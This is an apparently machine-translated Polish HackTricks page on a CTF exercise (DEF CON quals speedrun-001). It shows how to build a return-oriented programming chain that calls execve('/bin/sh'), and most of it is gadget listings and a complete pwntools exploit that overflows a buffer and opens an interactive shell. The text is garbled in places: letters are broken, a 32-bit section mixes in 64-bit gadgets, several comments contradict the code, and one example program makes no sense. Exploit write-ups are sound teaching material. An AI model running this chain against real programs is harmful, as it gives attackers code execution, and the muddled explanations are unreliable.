# ROP - wywoanie sys\_execve

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytori贸w github.**

</details>

Aby przygotowa wywoanie **syscall**, potrzebna jest nastpujca konfiguracja:

* `rax: 59 Okrel sys_execve`
* `rdi: wska藕nik do "/bin/sh" okrel plik do wykonania`
* `rsi: 0 okrel brak przekazywanych argument贸w`
* `rdx: 0 okrel brak przekazywanych zmiennych rodowiskowych`

Wic w zasadzie trzeba zapisa cig znak贸w `/bin/sh` gdzie, a nastpnie wykona `syscall` (biorc pod uwag wymagan wypenienie do kontrolowania stosu).

## Kontrola rejestr贸w

Zacznijmy od znalezienia **sposobu na kontrolowanie tych rejestr贸w**:
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
Z tymi adresami mo偶liwe jest **zapisanie zawartoci na stosie i zaadowanie jej do rejestr贸w**.

## Zapisz cig znak贸w

### Zapisywalna pami

Najpierw musisz znale藕 zapisywalne miejsce w pamici.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### Zapisz cig znak贸w

Nastpnie musisz znale藕 spos贸b na zapisanie dowolnej treci pod tym adresem.
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32 bity

##### ROP (Return Oriented Programming)

ROP (Return Oriented Programming) to technika wykorzystywana w celu wykonania kodu zoliwego na systemach 32-bitowych. Polega na wykorzystaniu istniejcych fragment贸w kodu zwanych "gadgetami" do skonstruowania sekwencji instrukcji, kt贸re wykonaj 偶dane dziaania.

##### Wywoanie systemowe execv()

Wywoanie systemowe execv() su偶y do uruchamiania nowego procesu w systemie Linux. Przyjmuje dwa argumenty: cie偶k do pliku wykonywalnego i tablic argument贸w. Funkcja execv() zastpuje bie偶cy proces nowym procesem, kt贸ry wykonuje kod z pliku wykonywalnego.

##### Wykorzystanie ROP do wykonania wywoania systemowego execv()

Aby wykorzysta ROP do wykonania wywoania systemowego execv(), musimy skonstruowa odpowiedni sekwencj gadget贸w. Pierwszym krokiem jest znalezienie gadgetu, kt贸ry umo偶liwi nam zaadowanie adresu funkcji execv() do rejestru EAX. Nastpnie musimy znale藕 gadgety, kt贸re umo偶liwi nam zaadowanie argument贸w do odpowiednich rejestr贸w. Ostatecznie, musimy znale藕 gadget, kt贸ry wywoa instrukcj INT 0x80, co spowoduje wykonanie wywoania systemowego.

Po skonstruowaniu sekwencji gadget贸w, musimy znale藕 odpowiednie adresy w pamici, aby skonstruowa payload. Mo偶emy to zrobi poprzez analiz wyciek贸w pamici lub innych technik.

Po skonstruowaniu payloadu, musimy go wstrzykn do programu, kt贸ry zostanie podatny na atak. Mo偶emy to zrobi poprzez nadpisanie odpowiednich obszar贸w pamici lub wykorzystanie innych podatnoci.

Po wykonaniu payloadu, wywoanie systemowe execv() zostanie wykonane, co spowoduje uruchomienie nowego procesu z podanymi argumentami.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 bity

##### ROP (Return Oriented Programming) - Wywoanie systemowe execv

W przypadku 64-bitowych system贸w operacyjnych, aby wywoa funkcj systemow execv, musimy skonstruowa acuch ROP, kt贸ry umo偶liwi nam ustawienie odpowiednich rejestr贸w i wywoanie funkcji execv.

##### Przykad

Poni偶ej przedstawiono przykad acucha ROP, kt贸ry wywouje funkcj execv, przekazujc cie偶k do pliku wykonywalnego jako argument:

```python
from pwn import *

# Adresy funkcji i gadget贸w
pop_rdi = 0x00000000004006b3
pop_rsi_r15 = 0x00000000004006b1
execv_addr = 0x7ffff7e5f440
bin_sh_addr = 0x7ffff7f6e3e9

# Tworzenie acucha ROP
rop = p64(pop_rdi)
rop += p64(bin_sh_addr)
rop += p64(pop_rsi_r15)
rop += p64(0)
rop += p64(0)
rop += p64(execv_addr)

# Wywoanie funkcji execv
p = process('./vulnerable_program')
p.sendline(rop)
p.interactive()
```

W powy偶szym przykadzie u偶ywamy biblioteki `pwn` do konstruowania acucha ROP. Adresy funkcji i gadget贸w musz by dostosowane do konkretnego systemu operacyjnego i wersji bibliotek.

Warto zauwa偶y, 偶e przed wywoaniem funkcji execv, musimy ustawi odpowiednie wartoci w rejestrach `rdi` i `rsi`. W powy偶szym przykadzie, `rdi` jest ustawiony na adres acucha `bin_sh_addr`, kt贸ry zawiera cie偶k do pliku wykonywalnego, a `rsi` jest ustawiony na 0, co oznacza brak argument贸w dla funkcji execv.

Po skonstruowaniu acucha ROP, mo偶emy go przesa do programu podatnego na atak i wywoa funkcj execv, co spowoduje uruchomienie pliku wykonywalnego wskazanego przez cie偶k `bin_sh_addr`.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## Przykad

Let's consider a simple example to understand how Return-Oriented Programming (ROP) can be used to execute a `syscall` function with the `execv` system call.

Rozwa偶my prosty przykad, aby zrozumie, jak Return-Oriented Programming (ROP) mo偶e by u偶ywane do wykonania funkcji `syscall` z wywoaniem systemowym `execv`.

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    char *args[] = {"/bin/sh", NULL};
    execv("/bin/sh", args);
    return 0;
}
```

The above C program executes the `/bin/sh` shell by calling the `execv` system call. Our goal is to exploit this program using ROP to execute the same shell without directly calling `execv`.

Powyzszy program w jzyku C wykonuje powok `/bin/sh`, wywoujc wywoanie systemowe `execv`. Naszym celem jest wykorzystanie tego programu za pomoc ROP, aby wykona t sam powok bez bezporedniego wywoywania `execv`.

To achieve this, we need to find gadgets (short sequences of instructions) in the program's memory that end with a `ret` instruction. These gadgets will allow us to chain together multiple gadgets to form a ROP chain.

Aby to osign, musimy znale藕 gad偶ety (kr贸tkie sekwencje instrukcji) w pamici programu, kt贸re kocz si instrukcj `ret`. Te gad偶ety pozwol nam poczy ze sob wiele gad偶et贸w, tworzc acuch ROP.

We can use a tool like `ROPgadget` to search for gadgets in the program's binary. Once we have identified the gadgets, we can construct a ROP chain that will execute the desired `syscall` function with the appropriate arguments.

Mo偶emy u偶y narzdzia takiego jak `ROPgadget`, aby wyszuka gad偶ety w binarnym pliku programu. Po zidentyfikowaniu gad偶et贸w mo偶emy skonstruowa acuch ROP, kt贸ry wykona po偶dan funkcj `syscall` z odpowiednimi argumentami.

The ROP chain will consist of the addresses of the gadgets we want to execute, followed by the arguments for the `syscall` function. We can then use a vulnerability in the program, such as a buffer overflow, to overwrite the return address on the stack with the address of the first gadget in our ROP chain.

acuch ROP bdzie skada si z adres贸w gad偶et贸w, kt贸re chcemy wykona, a nastpnie argument贸w dla funkcji `syscall`. Nastpnie mo偶emy wykorzysta podatno w programie, tak jak przepenienie bufora, aby nadpisa adres powrotu na stosie adresem pierwszego gad偶etu w naszym acuchu ROP.

When the vulnerable program returns, it will start executing the gadgets in our ROP chain. Each gadget will perform a specific operation, such as loading a value into a register or modifying the stack, before returning to the next gadget in the chain.

Gdy podatny program zwr贸ci si, zacznie wykonywa gad偶ety w naszym acuchu ROP. Ka偶dy gad偶et bdzie wykonywa okrelon operacj, tak jak wczytywanie wartoci do rejestru lub modyfikowanie stosu, przed powrotem do nastpnego gad偶etu w acuchu.

By carefully selecting and chaining together the right gadgets, we can manipulate the program's execution flow to achieve our goal of executing the `syscall` function with the desired arguments.

Dokadnie wybierajc i czc ze sob odpowiednie gad偶ety, mo偶emy manipulowa przepywem wykonania programu, aby osign nasz cel wykonania funkcji `syscall` z po偶danymi argumentami.
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## Odwoania

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
